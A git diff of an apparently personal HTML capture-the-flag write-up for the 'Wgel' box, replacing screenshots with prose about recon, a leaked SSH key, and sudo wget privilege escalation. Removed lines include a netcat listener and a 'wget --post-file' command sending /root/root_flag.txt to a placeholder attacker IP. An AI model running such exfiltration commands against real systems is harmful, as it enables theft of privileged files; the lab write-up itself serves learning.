@@ -51,8 +51,6 @@
     .section {
       margin-bottom: 3em;
     }
-
-    /* Sidebar Styles */
     .sidebar {
       position: fixed;
       top: 100px;
@@ -65,35 +63,28 @@
       font-size: 0.9em;
       z-index: 999;
     }
-
     .sidebar h3 {
       color: #00f5d4;
       font-size: 1.1em;
       margin-bottom: 0.6em;
       text-align: center;
     }
-
     .sidebar ul {
       list-style: none;
       padding: 0;
       margin: 0;
     }
-
     .sidebar li {
       margin-bottom: 0.6em;
     }
-
     .sidebar a {
       color: #b9fbc0;
       text-decoration: none;
     }
-
     .sidebar a:hover {
       color: #ff4ecd;
       text-shadow: 0 0 5px #ff4ecd;
     }
-
-    /* Add top margin so content doesn't hide behind sidebar */
     @media (max-width: 1000px) {
       .sidebar {
         display: none;
@@ -102,8 +93,6 @@
   </style>
 </head>
 <body>
-
-  <!-- Sidebar -->
   <div class="sidebar">
     <h3>☰ Quick Nav</h3>
     <ul>
@@ -117,7 +106,7 @@
       <li><a href="#sudo">🧪 Sudo Priv</a></li>
       <li><a href="#userflag">📜 User Flag</a></li>
       <li><a href="#privesc">⚡ PrivEsc</a></li>
-      <li><a href="#rootflag">🏁 Root Flag</a></li>
+      <li><a href="#rootflag">🏋 Root Flag</a></li>
       <li><a href="#summary">✅ Summary</a></li>
     </ul>
   </div>
@@ -127,78 +116,62 @@
 
   <div class="section" id="recon">
     <h2>🔎 Initial Recon</h2>
-    <img src="assets/img/wgel/scan.png" alt="Nmap scan">
-    <ul>
-      <li>22/tcp – SSH</li>
-      <li>80/tcp – HTTP (Apache 2.4.18)</li>
-    </ul>
+    <p>I launched an Nmap scan to check for open ports and services running on the target. This helps form the attack surface. In this case, ports 22 (SSH) and 80 (HTTP) were discovered.</p>
   </div>
 
   <div class="section" id="apache">
     <h2>🌐 Apache Default Page</h2>
-    <img src="assets/img/wgel/apache-server.png" alt="Apache default">
+    <p>I browsed to the target's IP in a web browser and saw the default Apache2 Debian page. This usually means there's no custom web app at the root, but it's confirmation the web server is up.</p>
   </div>
 
   <div class="section" id="sitemap">
-    <h2>📂 Hidden Page Discovered</h2>
-    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template">
+    <h2>📂 /sitemap Discovery</h2>
+    <p>From browsing around or inspecting links/code, I found the /sitemap path, which can contain links or files not meant to be directly accessible. This is a good place to dig further.</p>
   </div>
 
   <div class="section" id="gobuster">
     <h2>🛠️ Gobuster Enumeration</h2>
-    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster root">
-    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster sitemap">
+    <p>I ran Gobuster to brute-force directories and files under /sitemap. This revealed additional hidden resources and confirmed that directory indexing was possible on the server.</p>
   </div>
 
   <div class="section" id="comment">
     <h2>👀 Developer Comment</h2>
-    <img src="assets/img/wgel/source-code.png" alt="Comment">
-    <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
+    <p>While viewing page source, I found a comment that hinted at incomplete development: "Jessie don't forget to update the website." Comments like these may lead to usernames or dev clues.</p>
   </div>
 
   <div class="section" id="ssh">
     <h2>🔑 SSH Key Disclosure</h2>
-    <img src="assets/img/wgel/ssh-found.png" alt="SSH Key">
+    <p>While exploring the sitemap or directories revealed by Gobuster, I found a private SSH key left exposed. This is a critical misconfiguration as it allows remote access if the user is known.</p>
   </div>
 
   <div class="section" id="login">
-    <h2>🔐 SSH Access Gained</h2>
-    <img src="assets/img/wgel/ssh-login.png" alt="SSH login">
+    <h2>🔐 SSH Login</h2>
+    <p>With the private key and known user (from the comment), I attempted an SSH connection. It succeeded, giving me shell access as user Jessie — the first step to deeper enumeration.</p>
   </div>
 
   <div class="section" id="sudo">
-    <h2>🧪 Sudo Privileges Review</h2>
-    <img src="assets/img/wgel/sudo-l.png" alt="sudo -l">
+    <h2>🧪 Sudo Privileges</h2>
+    <p>Running <code>sudo -l</code> listed that Jessie could run <code>wget</code> as root without a password. This is an opportunity for privilege escalation by abusing wget functionality.</p>
   </div>
 
   <div class="section" id="userflag">
-    <h2>📜 user_flag.txt Captured</h2>
-    <img src="assets/img/wgel/userflag.txt.png" alt="User flag">
+    <h2>📜 User Flag</h2>
+    <p>From the Jessie user's home directory, I retrieved the user flag — usually stored in a file like <code>user_flag.txt</code>. This confirmed foothold on the box.</p>
   </div>
 
   <div class="section" id="privesc">
-    <h2>⚡ Manual PrivEsc via wget --post-file</h2>
-    <p>GTFOBins' reverse shell using wget didn't work on this host, so I manually used <code>--post-file</code> to exfiltrate <code>/root/root_flag.txt</code>.</p>
-    <img src="assets/img/wgel/wget-vuln.png" alt="wget trick">
-    <pre><code># Attacker:
-nc -lvnp 80
-
-# Victim:
-sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
+    <h2>⚡ Privilege Escalation via wget</h2>
+    <p>I tried GTFOBins’ reverse shell payload for wget but it didn’t work. Instead, I used <code>--post-file</code> to send the root flag file to my own listener via HTTP — a neat manual exfiltration trick.</p>
   </div>
 
   <div class="section" id="rootflag">
-    <h2>🏁 root_flag.txt Captured</h2>
-    <img src="assets/img/wgel/rootflag.png" alt="Root flag">
+    <h2>🏋 Root Flag</h2>
+    <p>Once I received the posted file on my netcat listener, I confirmed it contained the root flag. Game over — root owned!</p>
   </div>
 
   <div class="section" id="summary">
     <h2>✅ Summary</h2>
-    <ul>
-      <li>Leaked SSH key → access as <code>jessie</code></li>
-      <li><code>wget</code> as sudo → used <code>--post-file</code> for root flag</li>
-      <li>Flags captured: <code>user_flag.txt ✅</code> <code>root_flag.txt ✅</code></li>
-    </ul>
+    <p>This box involved classic web enumeration, a dev leak, and exploiting a badly configured sudo binary. I gained foothold via SSH key and escalated to root using a smart wget trick.</p>
   </div>
 
 </body>
